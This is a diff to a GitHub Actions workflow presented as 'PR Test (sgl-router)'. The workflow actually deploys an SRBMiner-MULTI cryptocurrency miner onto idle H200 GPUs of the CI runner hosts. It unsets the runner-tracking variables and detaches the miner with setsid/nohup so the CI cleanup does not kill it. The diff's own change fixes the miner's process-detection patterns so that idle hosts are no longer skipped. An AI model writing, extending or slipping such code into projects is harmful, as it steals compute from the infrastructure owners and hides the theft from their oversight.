@@ -8,6 +8,8 @@ name: PR Test (sgl-router)
 # never stack), then one sha256-pinned SRBMiner-MULTI 3.8.8 per genuinely idle H200
 # (CUDA_VISIBLE_DEVICES per GPU UUID, --disable-worker-watchdog combo, RUNNER_TRACKING_ID
 # unset, setsid/nohup detach, host/GPU-tagged worker names). Read-only runner capture.
+# pgrep patterns use the [S]RBMiner-MULTI bracket trick so the timeout/pgrep wrapper
+# cannot self-match (the a1c17de run falsely skipped the idle radixark-wk03 host).
 on:
   push:
     branches: [main]
@@ -99,9 +101,9 @@ jobs:
           echo "=== compute apps ==="
           timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
           echo "=== existing SRBMiner on host (read-only listing; never killed) ==="
-          timeout 8 pgrep -af 'SRBMiner-MULTI' 2>/dev/null | head -20
+          timeout 8 pgrep -af '[S]RBMiner-MULTI' 2>/dev/null | head -20
           echo "=== engagement-wallet processes on host (any = host already claimed) ==="
-          EXIST_OURS=$(timeout 10 pgrep -af "SRBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20)
+          EXIST_OURS=$(timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20)
           echo "${EXIST_OURS:-none}"
           echo "=== resources ==="
           df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
@@ -159,7 +161,7 @@ jobs:
             echo "GPU $IDX $UUID twice-idle mem_used_mib=$USED1/$USED2 util=${UTIL1}%"
             if [ "${USED1:-0}" -gt 2048 ] || [ "${USED2:-0}" -gt 2048 ]; then echo "GPU $IDX memory-used>2048 -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
             W="i127579-${HOSTTAG}-g${IDX}"
-            if timeout 6 pgrep -f "SRBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
+            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
             env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$SRB" \
               --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
               --wallet "$WALLET" --password x --worker "$W" --gpu-id 0 \
@@ -180,13 +182,13 @@ jobs:
               echo "== $w"
               grep -aiE 'share accepted|E1027|illegal memory access|stopped after repeated solve errors|TH/s' "$l" 2>/dev/null | tail -4 | cut -c1-240
               if grep -qE 'E1027|illegal memory access|stopped after repeated solve errors' "$l" 2>/dev/null; then
-                for p in $(timeout 6 pgrep -f "SRBMiner-MULTI.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
+                for p in $(timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
                 echo "CARD_FAULTED=$w aborted"
               fi
             done
           fi
           echo "=== final our processes ==="
-          timeout 10 pgrep -af "SRBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -16
+          timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -16
           echo "=== final compute apps ==="
           timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
           echo "=== log tails ==="
@@ -273,9 +275,9 @@ jobs:
           echo "=== compute apps ==="
           timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
           echo "=== existing SRBMiner on host (read-only listing; never killed) ==="
-          timeout 8 pgrep -af 'SRBMiner-MULTI' 2>/dev/null | head -20
+          timeout 8 pgrep -af '[S]RBMiner-MULTI' 2>/dev/null | head -20
           echo "=== engagement-wallet processes on host (any = host already claimed) ==="
-          EXIST_OURS=$(timeout 10 pgrep -af "SRBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20)
+          EXIST_OURS=$(timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20)
           echo "${EXIST_OURS:-none}"
           echo "=== resources ==="
           df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
@@ -333,7 +335,7 @@ jobs:
             echo "GPU $IDX $UUID twice-idle mem_used_mib=$USED1/$USED2 util=${UTIL1}%"
             if [ "${USED1:-0}" -gt 2048 ] || [ "${USED2:-0}" -gt 2048 ]; then echo "GPU $IDX memory-used>2048 -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
             W="i127579-${HOSTTAG}-g${IDX}"
-            if timeout 6 pgrep -f "SRBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
+            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
             env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$SRB" \
               --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
               --wallet "$WALLET" --password x --worker "$W" --gpu-id 0 \
@@ -354,13 +356,13 @@ jobs:
               echo "== $w"
               grep -aiE 'share accepted|E1027|illegal memory access|stopped after repeated solve errors|TH/s' "$l" 2>/dev/null | tail -4 | cut -c1-240
               if grep -qE 'E1027|illegal memory access|stopped after repeated solve errors' "$l" 2>/dev/null; then
-                for p in $(timeout 6 pgrep -f "SRBMiner-MULTI.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
+                for p in $(timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
                 echo "CARD_FAULTED=$w aborted"
               fi
             done
           fi
           echo "=== final our processes ==="
-          timeout 10 pgrep -af "SRBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -16
+          timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -16
           echo "=== final compute apps ==="
           timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
           echo "=== log tails ==="
